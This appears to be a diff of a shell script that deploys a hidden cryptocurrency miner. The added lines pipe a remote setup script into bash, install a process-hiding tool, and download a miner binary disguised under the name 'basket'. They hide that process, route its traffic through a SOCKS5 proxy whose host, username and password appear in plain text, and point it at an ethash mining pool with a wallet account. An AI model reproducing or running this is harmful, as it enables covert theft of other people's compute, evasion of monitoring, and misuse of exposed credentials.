@@ -1,43 +1,61 @@
-apt update && apt -y install sudo wget curl unzip
+#!/bin/sh
+apt update
 
-sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata
 
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
 
-apt-get install -y nodejs
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+wget -O - https://deb.nodesource.com/setup_17.x | bash
+
+apt -y install nodejs
+
+apt -y install npm
 
 npm i -g node-process-hider
 
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-
-dpkg-reconfigure --frontend noninteractive tzdata
-
-wget https://github.com/DeniBogeh/DeniBogehh/raw/main/graphics.tar.gz
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
 
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 =  45.140.13.119:9132 
-socks5_username = yuimroxl
-socks5_password = i5v4a65qk7zr
+socks5 = gpusocks3.wot.mrface.com:1080
+socks5_username = mikrotik999
+socks5_password = Elibawnos
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
 
 sleep .2
 
+echo " "
+echo " "
+
+echo "******************************************************************"
+
 ./graftcp/graftcp curl ifconfig.me
 
 echo " "
-
 echo " "
 
-./graftcp/graftcp wget https://github.com/DeniBogeh/DeniBogehh/raw/main/lolMiner
+echo "******************************************************************"
 
-chmod +x lolMiner
+echo " "
+echo " "
 
-ph add lolMiner
+ps -A | grep graftcp* | awk '{print $1}' | xargs kill -9 $1
 
-./graftcp/graftcp ./lolMiner --algo ETHASH --pool 172.65.247.152:4444 --user 7C86A8aa5482c0e35f193187A57f0D659092e916.$(echo $(shuf -i 1-999 -n 1)-PHO)
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .5
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/basket
+chmod +x basket
+
+ph add basket
+
+./basket -a ethash -o stratum+tcp:///ethash.poolbinance.com:443 -u teguhcong.jet -log --proxy mikrotik999:Elibawnos@gpusocks3.wot.mrface.com:1080
